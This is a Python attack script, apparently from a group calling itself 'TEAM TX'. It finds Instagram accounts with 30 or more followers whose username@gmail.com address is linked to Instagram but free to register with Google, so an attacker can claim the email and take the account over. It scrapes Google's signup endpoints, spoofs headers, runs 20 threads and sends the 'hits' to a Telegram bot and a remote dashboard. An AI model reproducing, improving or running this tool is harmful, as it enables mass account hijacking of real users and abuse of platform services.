# BY TEAM TX 
print("made by TEAM TX ")
import os, requests, sys, time, re, json, string, random, hashlib, uuid, webbrowser
from datetime import datetime
from threading import Thread
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr

# ================= FIXED DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Render Live URL - Localhost pe dashboard update nahi hoga
        url = 'https://system-override-v2.onrender.com/update_stats'
        requests.post(url, json={'type': stat_type}, timeout=3)
    except:
        pass

# Dashboard automatically ID aur Token bhejta hai
if len(sys.argv) > 2:
    ID = sys.argv[1]
    token = sys.argv[2]
else:
    ID = input("\033[1;36mEnter ID: ")
    token = input("\033[1;36mEnter Token: ")

def get_md5(data):
    return hashlib.md5(data).hexdigest()
# =============================================================

# Expiration Check
EXPIRE_TIME = '2080-03-30 11:00:00'
if datetime.now() > datetime.strptime(EXPIRE_TIME, '%Y-%m-%d %H:%M:%S'):
    print('\033[1;31mTHIS FILE STOPPED BY SHUBH')
    sys.exit(1)

hit_dustu = kotu_insta = orta_mail = 0
E = '\033[1;32m'; Z = '\033[1;31m'; X = '\033[1;33m'; G = '\033[1;36m'

def tll():
    try:
        n1=''.join(cc('azertyuiop') for i in range(rr(6,9)))
        n2=''.join(cc('azertyuiop') for i in range(rr(3,9)))
        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB')
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        
        headers = {'authority':'accounts.google.com','user-agent':gg()}
        data = {'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]'}
        response = pp('https://accounts.google.com/_/signup/validatepersonaldetails', headers=headers, data=data)
        
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', '')
        with open('tl.txt','w') as f: f.write(tl+'//'+host)
    except: tll()

def check_gmail(email):
    try:
        if not os.path.exists('tl.txt'): tll()
        with open('tl.txt','r') as f: o = f.read().splitlines()[0]
        tl, host = o.split('//')
        headers = {'authority':'accounts.google.com','user-agent':gg()}
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{email.split("@")[0]}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        res = pp('https://accounts.google.com/_/signup/usernameavailability', headers=headers, data=data, cookies={'__Host-GAPS': host})
        return 'good' if '"gf.uar",1' in res.text else 'bad'
    except: return 'bad'

def shelby_info(username):
    global hit_dustu
    hit_dustu += 1
    send_to_dashboard('hit') # HIT signal dashboard ko
    
    porno = f"""
━━━━━━━━━━━━━━━
🔥 HIGH FOLLOWER HIT!
👤 USER: @{username}
📧 EMAIL: {username}@gmail.com
📅 YEAR: 2014-15
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    print(E + porno)
    try:
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={porno}")
    except: pass

def seks(email):
    global kotu_insta, orta_mail
    try:
        headers = {'user-agent':gg(), 'x-csrftoken':get_md5(str(time.time()).encode())}
        res = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data={'email': email})
        
        if 'email_is_taken' in res.text:
            if check_gmail(email) == 'good':
                shelby_info(email.split('@')[0])
            else:
                orta_mail += 1
                send_to_dashboard('bad')
        else:
            kotu_insta += 1
            send_to_dashboard('bad')
    except: pass
    
    sys.stdout.write(f"\r{E}HIT: {hit_dustu} | {Z}BAD: {kotu_insta} | {X}MAIL: {orta_mail}")
    sys.stdout.flush()

def shubhvipfree():
    while True:
        try:
            lsd = ''.join(cc('eQ6xuzk5X8j6') for _ in range(16))
            id_range = str(rr(1900000000, 2100000000))
            headers = {'user-agent': gg(), 'x-fb-lsd': 'shubh' + lsd}
            data = {'lsd': 'shubh' + lsd, 'variables': f'{{"id":"{id_range}","render_surface":"PROFILE"}}', 'doc_id': '7397388303713986'}
            
            res = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()
            user = res.get('data', {}).get('user', {})
            username = user.get('username')
            # 30+ Followers filter (Isse premium hits milenge)
            if username and user.get('follower_count', 0) >= 30:
                seks(username + '@gmail.com')
        except: continue

# Setup & Run
if not os.path.exists('tl.txt'): tll()

# Threads - 20 threads Render free tier ke liye best performance dete hain
for _ in range(20):
    Thread(target=shubhvipfree, daemon=True).start()

while True:
    time.sleep(10)
